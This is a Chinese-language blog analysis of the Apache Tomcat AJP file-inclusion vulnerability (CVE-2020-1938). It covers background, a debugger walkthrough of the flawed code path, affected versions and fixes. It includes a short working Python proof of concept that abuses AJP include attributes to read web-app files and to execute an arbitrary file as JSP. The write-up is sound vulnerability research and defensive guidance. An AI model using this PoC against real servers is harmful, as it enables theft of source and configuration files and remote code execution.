\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[blog.riskivy.com\](https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/)

Apache Tomcat AJP 协议文件包含漏洞分析
----------------------------

背景
--

Tomcat 是由 Apache 软件基金会属下 Jakarta 项目开发的 Servlet 容器，按照 Sun Microsystems 提供的技术规范，实现了对 Servlet 和 JavaServer Page（JSP）的支持。由于 Tomcat 本身也内含了 HTTP 服务器，因此也可以视作单独的 Web 服务器。2020 年 1 月 6 日，国家信息安全漏洞共享平台（CNVD）收录了 Apache Tomcat 文件包含漏洞（CNVD-2020-10487，对应 CVE-2020-1938）。攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等，若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。

AJP 简介
------

AJP 的全称是 Apache JServ Protocol，支持 AJP 协议的 Web 容器包括 Apache Tomcat，JBoss AS / WildFly 和 GlassFish  
AJP 是一个二进制协议，通常在存在负载平衡的部署中使用 AJP，一般位于 Web 服务器的后面，使用路由机制将会话重定向到正确的应用服务器，其中每个应用服务器实例都获得一个名称。在这种情况下，Web 服务器充当应用程序服务器的反向代理。最后，AJP 支持请求属性，当在反向代理中使用特定于环境的设置填充请求属性时，该属性可提供反向代理与应用程序服务器之间的安全通信。

漏洞分析
----

### 运行 Tomcat

打开下面的 URL 下载 Tomcat 运行程序  
https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.96/bin/apache-tomcat-7.0.96.zip  
并进入`bin`目录执行 `catalina.bat jpda start` 采用调试模式启动 `Tomcat` 服务器

![](https://blog.riskivy.com/wp-content/uploads/2020/02/923909c034dff008205373da86b765ae.png)

### 漏洞 PoC

下载 https://github.com/hypn0s/AJPy ，并导入 Tomcat 类

```
t = Tomcat("127.0.0.1", 8009)
attributes = \[
{'name':'req\_attribute','value':\['javax.servlet.include.request\_uri','/'\]},
    {'name':'req\_attribute','value':\['javax.servlet.include.path\_info','/index.jsp'\]},
    {'name':'req\_attribute','value':\['javax.servlet.include.servlet\_path','/'\]},
\]

r = t.perform\_request("/fdsdf", attributes=attributes)
for x in r\[1\]:
   print(x.data)


```

可以看到读取到了 index.jsp 的源码

![](https://blog.riskivy.com/wp-content/uploads/2020/02/c880bc2129a581ad10b49d85bdec87f6.png)

如果要执行 webapp 下的一个非 jsp 文件，将 perform\_request 改成下面即可

```
r = t.perform\_request("/fdsdf.jsp", attributes=attributes)


```

### 调试分析

在下面的位置打断点，此时 request 才刚开始处理  
tomcat-coyote.jar!/org/apache/coyote/ajp/AjpProcessor.class:40  
![](https://blog.riskivy.com/wp-content/uploads/2020/02/669447ea22f54c9b09199f37ef44491a.png)

在 tomcat-coyote.jar!/org/apache/coyote/ajp/AbstractAjpProcessor.class:532 中可以看到设置了当前 request 的属性，其中字段名为在 PoC 传入的 `javax.servlet.include.*`字段  
![](https://blog.riskivy.com/wp-content/uploads/2020/02/983fa480f841b098a8a3c69b35e1bf20.png)

通过 CoyoteAdapter 的 postParseRequest 函数进入到 Servlet 的处理流程  
catalina.jar!/org/apache/catalina/connector/CoyoteAdapter.class:328  
![](https://blog.riskivy.com/wp-content/uploads/2020/02/bbe1dec7aa01c0efef5bc3964158a5c6.png)

### 任意文件读取

根据 Tomcat 默认路由规则，/fdsdf 将会匹配到 DefaultServlet  
org.apache.catalina.servlets.DefaultServlet#serveResource  
![](https://blog.riskivy.com/wp-content/uploads/2020/02/b68e301d8c14c06005ea2136ea9fb17b.png)

catalina.jar!/org/apache/catalina/servlets/DefaultServlet.class:171  
进入到 serveResource，将会调用 getRelativePath 从属性中获取真正的路径  
![](https://blog.riskivy.com/wp-content/uploads/2020/02/1c9050740ff2317e152326fdd8d7527d.png)

通过自定义下面三个属性可以达到 WEB 目录下任意文件读取的作用。

```
javax.servlet.include.request\_uri
javax.servlet.include.path\_info
javax.servlet.include.servlet\_path


```

### 任意文件后缀代码执行

根据 Tomcat 默认路由规则，/fdsdf.jsp 将会匹配到 JspServlet  
![](https://blog.riskivy.com/wp-content/uploads/2020/02/65e9366057cc823b49ec43b325bb38d1.png)  
将目标 1.txt 当成 jsp 执行  
![](https://blog.riskivy.com/wp-content/uploads/2020/02/1d7135efce673279c43b99ed4365e987.png)

### 为什么不能读取 WEB 目录外的文件

以进入到 DefaultServlet 为例，进入到函数 serveResource 函数，最终会调用  
catalina.jar!/org/apache/naming/resources/FileDirContext.class:302 中的 Validate 函数，这里面包含多次验证，无法绕过 WEB 目录  
![](https://blog.riskivy.com/wp-content/uploads/2020/02/78677df441e7ccd386756ec8ea712c48.png)

影响版本
----

Apache Tomcat 6  
Apache Tomcat 7 < 7.0.100  
Apache Tomcat 8 < 8.5.51  
Apache Tomcat 9 < 9.0.31

修复建议
----

### 1\. 更新到安全版本

Apache Tomcat 7.0.100  
Apache Tomcat 8.5.51  
Apache Tomcat 9.0.31

### 2\. 关闭 AJP 服务

（1）编辑 Tomcat 配置文件 conf/server.xml，找到如下行

```
<Connector port="8009"protocol="AJP/1.3" redirectPort="8443" />


```

（2）将此行进行注释掉

```
<!--<Connectorport="8009" protocol="AJP/1.3"redirectPort="8443" />-->


```

（3）保存配置文件，重新启动 Tomcat

参考
--

https://www.cnvd.org.cn/flaw/show/CNVD-2020-10487  
http://tomcat.apache.org/